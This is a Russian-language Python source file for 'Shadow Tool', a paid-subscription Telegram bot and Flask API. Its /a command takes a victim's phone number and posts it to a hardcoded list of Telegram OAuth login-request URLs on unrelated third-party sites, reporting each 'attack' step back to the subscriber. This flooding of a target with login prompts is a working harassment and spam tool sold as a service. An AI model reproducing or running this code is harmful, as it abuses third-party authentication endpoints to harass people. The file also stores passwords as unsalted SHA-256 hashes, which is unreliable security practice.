import asyncio
import sqlite3
import os
import sys
import hashlib
import secrets
import requests
import threading
from datetime import datetime, timedelta

from flask import Flask, jsonify, request
from flask_cors import CORS
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram.utils import executor
import nest_asyncio

nest_asyncio.apply()

# ========== ПЕРЕМЕННЫЕ ОКРУЖЕНИЯ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS_RAW = os.environ.get('ADMIN_ID', '')
WHITELIST_GIST_URL = os.environ.get('WHITELIST_GIST_URL', '')

ADMIN_IDS = []
if ADMIN_IDS_RAW:
    for part in ADMIN_IDS_RAW.split(','):
        part = part.strip()
        if part.isdigit():
            ADMIN_IDS.append(int(part))

if not BOT_TOKEN:
    print("❌ BOT_TOKEN не задан")
    sys.exit(1)

if not ADMIN_IDS:
    print("❌ ADMIN_ID не задан")
    sys.exit(1)

print(f"✅ Админы: {ADMIN_IDS}")

# ========== БАЗА ДАННЫХ ==========
VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'shadowtool.db')
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS web_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        login TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS web_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        token TEXT UNIQUE NOT NULL,
        expires_at TEXT NOT NULL
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS subscriptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        login TEXT NOT NULL,
        plan_type TEXT NOT NULL,
        start_date TEXT NOT NULL,
        end_date TEXT NOT NULL,
        status TEXT DEFAULT 'active'
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS telegram_binds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        telegram_id INTEGER UNIQUE NOT NULL,
        bind_date TEXT,
        FOREIGN KEY (user_id) REFERENCES web_users(id)
    )
''')
conn.commit()

bind_codes = {}

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
]

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith('+'):
        return '+' + ''.join(c for c in phone if c.isdigit())
    else:
        return ''.join(c for c in phone if c.isdigit())

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_token():
    return secrets.token_urlsafe(32)

def is_admin(user_id):
    return user_id in ADMIN_IDS

async def is_phone_whitelisted(phone):
    if not WHITELIST_GIST_URL:
        return False
    
    search_phone = normalize_phone(phone)
    
    try:
        resp = await asyncio.to_thread(requests.get, WHITELIST_GIST_URL + '?t=' + str(int(datetime.now().timestamp())), timeout=10)
        data = resp.json()
        whitelist = data.get('phones', [])
        
        for item in whitelist:
            item_phone = item.get('number', '')
            item_normalized = normalize_phone(item_phone)
            if search_phone == item_normalized:
                return True
        return False
    except:
        return False

# ========== FLASK API ==========
flask_app = Flask(__name__)
CORS(flask_app)

@flask_app.route('/')
def index():
    return jsonify({'message': 'Shadow Tool API'})

@flask_app.route('/health')
def health():
    return jsonify({'status': 'ok'})

@flask_app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    login = data.get('login')
    password = data.get('password')
    
    if not login or not password:
        return jsonify({'error': 'Login and password required'}), 400
    
    cursor.execute('SELECT id FROM web_users WHERE login=?', (login,))
    if cursor.fetchone():
        return jsonify({'error': 'Login already exists'}), 400
    
    password_hash = hash_password(password)
    cursor.execute('INSERT INTO web_users (login, password_hash) VALUES (?, ?)', (login, password_hash))
    conn.commit()
    user_id = cursor.lastrowid
    
    token = generate_token()
    expires_at = (datetime.now() + timedelta(days=30)).isoformat()
    cursor.execute('INSERT INTO web_sessions (user_id, token, expires_at) VALUES (?, ?, ?)', (user_id, token, expires_at))
    conn.commit()
    
    return jsonify({'success': True, 'token': token, 'login': login})

@flask_app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    login = data.get('login')
    password = data.get('password')
    
    if not login or not password:
        return jsonify({'error': 'Login and password required'}), 400
    
    password_hash = hash_password(password)
    cursor.execute('SELECT id FROM web_users WHERE login=? AND password_hash=?', (login, password_hash))
    row = cursor.fetchone()
    
    if not row:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    user_id = row[0]
    
    cursor.execute('DELETE FROM web_sessions WHERE user_id=?', (user_id,))
    
    token = generate_token()
    expires_at = (datetime.now() + timedelta(days=30)).isoformat()
    cursor.execute('INSERT INTO web_sessions (user_id, token, expires_at) VALUES (?, ?, ?)', (user_id, token, expires_at))
    conn.commit()
    
    return jsonify({'success': True, 'token': token, 'login': login})

@flask_app.route('/me', methods=['GET'])
def me():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not token:
        return jsonify({'error': 'No token'}), 401
    
    cursor.execute('''
        SELECT web_users.id, web_users.login, web_sessions.expires_at 
        FROM web_sessions 
        JOIN web_users ON web_sessions.user_id = web_users.id 
        WHERE web_sessions.token=? AND web_sessions.expires_at > ?
    ''', (token, datetime.now().isoformat()))
    row = cursor.fetchone()
    
    if not row:
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    cursor.execute('SELECT telegram_id FROM telegram_binds WHERE user_id=?', (row[0],))
    bind = cursor.fetchone()
    
    return jsonify({'id': row[0], 'login': row[1], 'telegram_bound': bind is not None})

@flask_app.route('/check_subscription', methods=['GET'])
def check_subscription():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not token:
        return jsonify({'has_access': False, 'error': 'No token'}), 401
    
    cursor.execute('SELECT user_id FROM web_sessions WHERE token=? AND expires_at > ?', (token, datetime.now().isoformat()))
    row = cursor.fetchone()
    if not row:
        return jsonify({'has_access': False, 'error': 'Invalid session'}), 401
    
    user_id = row[0]
    
    cursor.execute('''
        SELECT plan_type, end_date, status 
        FROM subscriptions 
        WHERE user_id=? AND status='active' AND end_date > ?
    ''', (user_id, datetime.now().isoformat()))
    sub = cursor.fetchone()
    
    if sub:
        return jsonify({'has_access': True, 'plan': sub[0], 'expires_at': sub[1]})
    else:
        return jsonify({'has_access': False})

@flask_app.route('/is_whitelisted', methods=['POST'])
def is_whitelisted():
    if not WHITELIST_GIST_URL:
        return jsonify({'blocked': False})
    
    data = request.get_json()
    phone = data.get('phone', '')
    normalized = normalize_phone(phone)
    
    try:
        resp = requests.get(WHITELIST_GIST_URL + '?t=' + str(int(datetime.now().timestamp())), timeout=10)
        data = resp.json()
        whitelist = data.get('phones', [])
        for item in whitelist:
            item_normalized = normalize_phone(item.get('number', ''))
            if item_normalized == normalized:
                return jsonify({'blocked': True})
        return jsonify({'blocked': False})
    except:
        return jsonify({'blocked': False})

@flask_app.route('/generate_bind_code', methods=['POST'])
def generate_bind_code():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not token:
        return jsonify({'error': 'No token'}), 401
    
    cursor.execute('SELECT user_id FROM web_sessions WHERE token=? AND expires_at > ?', (token, datetime.now().isoformat()))
    row = cursor.fetchone()
    if not row:
        return jsonify({'error': 'Invalid session'}), 401
    
    user_id = row[0]
    
    code = secrets.token_hex(4).upper()
    bind_codes[code] = user_id
    
    def remove_code():
        import time
        time.sleep(300)
        bind_codes.pop(code, None)
    
    threading.Thread(target=remove_code).start()
    
    return jsonify({'code': code})

# ========== TELEGRAM БОТ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

async def send_attack_log(telegram_id, total, current, phone, status_msg, message_id=None):
    text = f"🎯 <b>АТАКА НА {phone}</b>\n\n📊 <b>Прогресс:</b> {current}/{total}\n{status_msg}"
    
    if message_id:
        try:
            await bot.edit_message_text(text, chat_id=telegram_id, message_id=message_id, parse_mode='HTML')
            return message_id
        except:
            pass
    
    msg = await bot.send_message(telegram_id, text, parse_mode='HTML')
    return msg.message_id

async def perform_attack(phone, telegram_id, user_id, message_id):
    normalized_phone = normalize_phone(phone)
    
    if await is_phone_whitelisted(normalized_phone):
        await bot.edit_message_text(
            f"⛔ <b>АТАКА ОТМЕНЕНА</b>\n\n📞 Номер: {phone}\n⚠️ Номер в белом списке",
            chat_id=telegram_id, message_id=message_id, parse_mode='HTML'
        )
        return
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    
    success = 0
    total = len(ATTACK_URLS)
    
    for i, url in enumerate(ATTACK_URLS):
        try:
            await asyncio.to_thread(requests.post, url, data={'phone': phone}, headers=headers, timeout=10)
            success += 1
            message_id = await send_attack_log(telegram_id, total, i+1, phone, f"✅ Отправлено: {success}", message_id)
        except Exception as e:
            message_id = await send_attack_log(telegram_id, total, i+1, phone, f"⚠️ Ошибка: {success}", message_id)
        await asyncio.sleep(0.15)
    
    await bot.edit_message_text(
        f"🎯 <b>АТАКА ЗАВЕРШЕНА!</b>\n\n📞 Номер: {phone}\n✅ Успешно: {success}/{total}\n🕒 {datetime.now().strftime('%H:%M:%S')}",
        chat_id=telegram_id, message_id=message_id, parse_mode='HTML'
    )

@dp.message_handler(commands=['start', 'help'])
async def cmd_start(message: Message):
    await message.answer(
        "🔰 <b>SHADOW TOOL</b>\n\n"
        "📌 <b>Команды:</b>\n"
        "/a <code>номер</code> - атака\n"
        "/bind <code>КОД</code> - привязать аккаунт\n"
        "/unbind - отвязать Telegram\n"
        "/status - статус подписки",
        parse_mode='HTML'
    )

@dp.message_handler(commands=['a'])
async def cmd_attack_short(message: Message):
    args = message.get_args().strip()
    
    if not args:
        await message.answer("❌ /a НОМЕР\nПример: /a 79001234567")
        return
    
    user_tg_id = message.from_user.id
    
    cursor.execute('SELECT user_id FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
    row = cursor.fetchone()
    
    if not row:
        await message.answer("❌ Telegram не привязан. /bind КОД")
        return
    
    user_id = row[0]
    
    cursor.execute('SELECT end_date FROM subscriptions WHERE user_id=? AND status="active" AND end_date > ?', 
                   (user_id, datetime.now().isoformat()))
    sub = cursor.fetchone()
    
    if not sub:
        await message.answer("❌ Нет активной подписки")
        return
    
    phone = args.strip()
    digits = ''.join(c for c in phone if c.isdigit())
    if len(digits) < 5:
        await message.answer("❌ Неверный формат номера")
        return
    
    msg = await message.answer(f"🚀 Атака на {phone}...", parse_mode='HTML')
    asyncio.create_task(perform_attack(phone, user_tg_id, user_id, msg.message_id))

@dp.message_handler(commands=['bind'])
async def cmd_bind(message: Message):
    user_tg_id = message.from_user.id
    code = message.get_args().strip()
    
    if not code:
        await message.answer("❌ /bind КОД")
        return
    
    if code not in bind_codes:
        await message.answer("❌ Неверный код")
        return
    
    user_id = bind_codes[code]
    
    cursor.execute('SELECT user_id FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
    if cursor.fetchone():
        await message.answer("❌ Telegram уже привязан")
        return
    
    cursor.execute('INSERT INTO telegram_binds (user_id, telegram_id, bind_date) VALUES (?, ?, ?)',
                   (user_id, user_tg_id, datetime.now().isoformat()))
    conn.commit()
    
    del bind_codes[code]
    
    await message.answer("✅ Telegram привязан! /a НОМЕР")

@dp.message_handler(commands=['unbind'])
async def cmd_unbind(message: Message):
    user_tg_id = message.from_user.id
    
    cursor.execute('DELETE FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
    conn.commit()
    
    if cursor.rowcount > 0:
        await message.answer("✅ Отвязан")
    else:
        await message.answer("❌ Не был привязан")

@dp.message_handler(commands=['status'])
async def cmd_status(message: Message):
    user_tg_id = message.from_user.id
    
    cursor.execute('SELECT user_id FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
    row = cursor.fetchone()
    
    if not row:
        await message.answer("❌ Telegram не привязан")
        return
    
    user_id = row[0]
    
    cursor.execute('SELECT login, plan_type, end_date FROM subscriptions WHERE user_id=? AND status="active" AND end_date > ?', 
                   (user_id, datetime.now().isoformat()))
    sub = cursor.fetchone()
    
    if not sub:
        await message.answer("❌ Нет подписки")
        return
    
    login, plan, end_date = sub
    days = plan.replace('_days', '')
    end = datetime.fromisoformat(end_date)
    days_left = (end - datetime.now()).days
    
    await message.answer(
        f"✅ <b>СТАТУС</b>\n\n"
        f"👤 Логин: {login}\n"
        f"📅 Осталось: {days_left} дн.\n"
        f"📆 Истекает: {end.strftime('%d.%m.%Y')}",
        parse_mode='HTML'
    )

# ========== АДМИН-КОМАНДЫ ==========
@dp.message_handler(commands=['users'])
async def cmd_users(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    cursor.execute('''
        SELECT w.id, w.login, w.created_at, s.plan_type, s.end_date, b.telegram_id
        FROM web_users w
        LEFT JOIN subscriptions s ON w.id = s.user_id AND s.status = 'active'
        LEFT JOIN telegram_binds b ON w.id = b.user_id
        ORDER BY w.id DESC
    ''')
    rows = cursor.fetchall()
    
    if not rows:
        await message.answer("📭 Нет пользователей")
        return
    
    out = "👥 <b>ПОЛЬЗОВАТЕЛИ</b>\n\n"
    for uid, login, created, plan, end_date, tg_id in rows:
        sub_info = f"\n   📅 {plan.replace('_days', '')} дн." if plan else "\n   ❌ Нет подписки"
        tg_info = f"\n   🤖 Telegram: {'✅' if tg_id else '❌'}"
        out += f"• {login} (ID: {uid})\n   📅 Рег: {created[:10]}{sub_info}{tg_info}\n\n"
        if len(out) > 3500:
            await message.answer(out, parse_mode='HTML')
            out = ""
    if out:
        await message.answer(out, parse_mode='HTML')

@dp.message_handler(commands=['addsub'])
async def cmd_addsub(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    args = message.get_args().split()
    if len(args) < 2:
        await message.answer("❌ /addsub логин дни")
        return
    
    login = args[0]
    try:
        days = int(args[1])
    except:
        await message.answer("❌ Дни должны быть числом")
        return
    
    cursor.execute('SELECT id, login FROM web_users WHERE login=?', (login,))
    row = cursor.fetchone()
    if not row:
        await message.answer(f"❌ Пользователь {login} не найден")
        return
    
    user_id, user_login = row
    
    start_date = datetime.now()
    end_date = start_date + timedelta(days=days)
    
    cursor.execute('UPDATE subscriptions SET status="expired" WHERE user_id=? AND status="active"', (user_id,))
    cursor.execute('INSERT INTO subscriptions (user_id, login, plan_type, start_date, end_date, status) VALUES (?, ?, ?, ?, ?, "active")',
                   (user_id, user_login, f"{days}_days", start_date.isoformat(), end_date.isoformat()))
    conn.commit()
    
    await message.answer(f"✅ Подписка на {days} дней для {user_login} до {end_date.strftime('%d.%m.%Y')}")

@dp.message_handler(commands=['delsub'])
async def cmd_delsub(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    args = message.get_args().split()
    if len(args) < 1:
        await message.answer("❌ /delsub логин")
        return
    
    login = args[0]
    
    cursor.execute('SELECT id FROM web_users WHERE login=?', (login,))
    row = cursor.fetchone()
    if not row:
        await message.answer(f"❌ Пользователь {login} не найден")
        return
    
    user_id = row[0]
    cursor.execute('UPDATE subscriptions SET status="expired" WHERE user_id=? AND status="active"', (user_id,))
    conn.commit()
    
    await message.answer(f"✅ Подписка для {login} удалена")

@dp.message_handler(commands=['subs'])
async def cmd_subs(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    cursor.execute('SELECT login, plan_type, end_date FROM subscriptions WHERE status="active" ORDER BY end_date ASC')
    rows = cursor.fetchall()
    
    if not rows:
        await message.answer("📭 Нет активных подписок")
        return
    
    text = "📋 <b>АКТИВНЫЕ ПОДПИСКИ</b>\n\n"
    for login, plan, end_date in rows:
        days = plan.replace('_days', '')
        text += f"✅ {login} — {days} дн. (до {end_date[:10]})\n"
    
    await message.answer(text[:4000], parse_mode='HTML')

# ========== ЗАПУСК ==========
def run_web():
    port = int(os.environ.get('PORT', 8080))
    flask_app.run(host='0.0.0.0', port=port, debug=False)

async def main():
    print(f"🚀 SHADOW TOOL запущен")
    me = await bot.get_me()
    print(f"🤖 Бот: https://t.me/{me.username}")

if __name__ == '__main__':
    from threading import Thread
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.create_task(main())
